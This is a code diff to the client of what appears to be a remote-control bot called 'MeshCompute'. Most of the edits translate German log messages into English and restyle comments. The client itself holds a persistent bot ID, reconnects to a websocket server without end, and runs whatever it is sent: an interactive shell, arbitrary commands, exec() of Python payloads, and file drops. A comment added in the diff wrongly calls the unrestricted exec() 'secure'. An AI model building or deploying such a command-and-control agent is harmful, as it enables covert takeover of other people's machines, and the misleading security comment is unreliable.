@@ -1,3 +1,4 @@
+# client/main.py
 import asyncio
 import json
 import uuid
@@ -14,11 +15,10 @@ import websockets
 from common.config import SERVER_URL, MAX_COMMAND_TIMEOUT
 
 load_dotenv()
-
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# ====================== BOT ID ======================
+# ---- BOT ID ----
 BOT_ID_FILE = "client/bot_id.txt"
 if os.path.exists(BOT_ID_FILE):
     with open(BOT_ID_FILE, "r") as f:
@@ -29,7 +29,7 @@ else:
     with open(BOT_ID_FILE, "w") as f:
         f.write(BOT_ID)
 
-# ====================== HELPER FUNCTIONS ======================
+# ---- HELPER FUNCTIONS ----
 async def get_system_info():
     return {
         "hostname": platform.node(),
@@ -65,32 +65,30 @@ async def execute_command(cmd: str, timeout=MAX_COMMAND_TIMEOUT):
     except Exception as e:
         return {"success": False, "error": str(e)}
 
-# ====================== MAIN ======================
+# ---- MAIN ----
 async def main():
-    print(f"🚀 MeshCompute Client gestartet → {BOT_ID}")
-
+    print(f"MeshCompute Client started → {BOT_ID}")
     while True:
         try:
             async with websockets.connect(SERVER_URL, ping_interval=20, ping_timeout=40) as ws:
                 await ws.send(json.dumps({"type": "client", "bot_id": BOT_ID}))
-                logger.info(f"✅ Verbunden als {BOT_ID}")
-
+                logger.info(f"Connected as {BOT_ID}")
                 async for raw_msg in ws:
                     try:
                         msg = json.loads(raw_msg)
 
-                        # ====================== INTERACTIVE SHELL ======================
+                        # ---- INTERACTIVE SHELL ----
                         if msg.get("action") == "shell":
+                            # Start message with task_id so that the controller recognizes them
                             await ws.send(json.dumps({
                                 "type": "shell_output",
                                 "output": f"Shell gestartet auf {BOT_ID}\n",
-                                "bot_id": BOT_ID
+                                "bot_id": BOT_ID,
+                                "task_id": msg.get("task_id")
                             }))
-
                         elif msg.get("type") == "shell_input":
                             command = msg.get("command", "")
                             task_id = msg.get("task_id")
-
                             if command.lower() in ["exit", "quit"]:
                                 await ws.send(json.dumps({
                                     "type": "shell_exit",
@@ -98,13 +96,11 @@ async def main():
                                     "task_id": task_id
                                 }))
                                 continue
-
-                            # Befehl ausführen
+                            # execute Commands
                             result = await execute_command(command)
                             output = result.get("output", "")
                             if result.get("error"):
                                 output += "\n" + result["error"]
-
                             await ws.send(json.dumps({
                                 "type": "shell_output",
                                 "output": output,
@@ -112,21 +108,18 @@ async def main():
                                 "task_id": task_id
                             }))
 
-                        # ====================== FILE UPLOAD ======================
+                        # ---- FILE UPLOAD ----
                         elif msg.get("type") == "file_upload":
                             filename = msg.get("filename")
                             content_b64 = msg.get("content")
                             task_id = msg.get("task_id")
-
                             try:
                                 data = base64.b64decode(content_b64)
                                 upload_dir = Path("uploads")
                                 upload_dir.mkdir(exist_ok=True)
                                 file_path = upload_dir / filename
-
                                 with open(file_path, "wb") as f:
                                     f.write(data)
-
                                 await ws.send(json.dumps({
                                     "type": "file_upload_done",
                                     "bot_id": BOT_ID,
@@ -135,7 +128,7 @@ async def main():
                                     "path": str(file_path),
                                     "size": len(data)
                                 }))
-                                logger.info(f"📁 Datei gespeichert: {file_path}")
+                                logger.info(f"Datei gespeichert: {file_path}")
                             except Exception as e:
                                 logger.error(f"Upload-Fehler: {e}")
                                 await ws.send(json.dumps({
@@ -145,7 +138,7 @@ async def main():
                                     "error": str(e)
                                 }))
 
-                        # ====================== NORMALE COMMANDS ======================
+                        # ---- NORMAL COMMANDS ----
                         elif "action" in msg:
                             action = msg["action"]
                             task_id = msg.get("task_id")
@@ -156,7 +149,6 @@ async def main():
                                 "bot_id": BOT_ID,
                                 "action": action
                             }
-
                             try:
                                 if action == "exec":
                                     res = await execute_command(payload)
@@ -165,6 +157,7 @@ async def main():
                                     result["success"] = True
                                     result["info"] = await get_system_info()
                                 elif action == "python":
+                                    # Secure exec with limited globals dict
                                     exec_globals = {}
                                     exec(payload, exec_globals)
                                     result.update({
@@ -173,29 +166,27 @@ async def main():
                                     })
                                 elif action == "ps":
                                     processes = [{"pid": p.info['pid'], "name": p.info['name']}
-                                                for p in psutil.process_iter(['pid', 'name'])][:30]
+                                                 for p in psutil.process_iter(['pid', 'name'])][:30]
                                     result.update({"success": True, "processes": processes})
                                 elif action == "ping":
                                     result.update({"success": True, "message": "pong"})
                                 else:
-                                    result.update({"success": False, "error": f"Unbekannte Aktion: {action}"})
+                                    result.update({"success": False, "error": f"Unknown action: {action}"})
                             except Exception as e:
                                 result.update({"success": False, "error": str(e)})
-
                             await ws.send(json.dumps(result))
 
                     except json.JSONDecodeError:
                         continue
                     except Exception as e:
-                        logger.warning(f"Nachrichtenverarbeitungsfehler: {e}")
+                        logger.warning(f"Message processing error: {e}")
 
         except websockets.exceptions.ConnectionClosed:
-            logger.warning("Verbindung zum Server verloren → Reconnect...")
+            logger.warning("Lost connection to the server → Reconnect...")
             await asyncio.sleep(3)
         except Exception as e:
-            logger.error(f"Verbindungsfehler: {e}")
+            logger.error(f"Connection failed: {e}")
             await asyncio.sleep(3)
-
 
 if __name__ == "__main__":
     asyncio.run(main())
